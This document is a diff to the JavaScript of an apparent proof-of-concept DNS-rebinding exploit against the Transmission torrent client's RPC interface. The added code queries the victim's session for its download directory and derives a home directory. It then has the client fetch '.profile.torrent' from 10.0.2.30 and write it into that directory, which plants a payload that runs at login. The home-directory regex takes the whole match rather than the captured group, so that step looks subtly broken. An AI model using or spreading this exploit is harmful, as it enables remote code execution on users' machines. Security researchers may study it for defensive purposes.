@@ -3,14 +3,22 @@ var frame;
 var sessionid;
 var xhr;
 var interval = 60000;
-var command = JSON.stringify({
-		method: "torrent-add",
-		arguments: {
-			"download-dir": "$HOME",
-			filename: "http://10.0.2.30/.profile.torrent",
-			paused: false
-		}
-	});
+
+var getSession = JSON.stringify({
+	method: "session-get",
+	arguments: {}
+});
+
+var startDownload = {
+	method: "torrent-add",
+	arguments: {
+		"download-dir": "/home/victim",
+		filename: "http://10.0.2.30/.profile.torrent",
+		paused: false
+	}
+};
+
+var command = getSession;
 
 function sendRpc() {
 	xhr = new XMLHttpRequest();
@@ -26,7 +34,7 @@ function sendRpc() {
 		console.log("failed to send xhr");
 	}
 
-	if (xhr.status == 404) {
+	if (xhr.status == 404 || xhr.status == 501) {
 		console.log("frame", window.location.hostname, "has not updated dns yet, waiting", interval, "milliseconds");
 		return;
 	}
@@ -34,8 +42,17 @@ function sendRpc() {
 	console.log("attack frame", window.location.hostname, "received xhr response", xhr.status);
 
 	if (xhr.status == 200) {
-		clearInterval(timer);
-		window.parent.postMessage({status: "pwned", response: xhr.responseText}, "*");
+		if (command !== getSession) {
+			clearInterval(timer);
+			window.parent.postMessage({status: "pwned", response: xhr.responseText }, "*");
+		} else {
+			var downloadDir = JSON.parse(xhr.responseText).arguments["download-dir"];
+			var regex = /^(\/home\/[^\/]+\/).*$/g
+			var homeDir = regex.exec(downloadDir)[0];
+			console.log("Got homeDir as: ", homeDir);
+			startDownload.arguments["download-dir"] = homeDir;
+			command = JSON.stringify(startDownload);
+		}
 	} else if (xhr.status == 409) {
 		sessionid = xhr.getResponseHeader("X-Transmission-Session-Id")
 		window.parent.postMessage({status: "session", sessionid: sessionid }, "*")
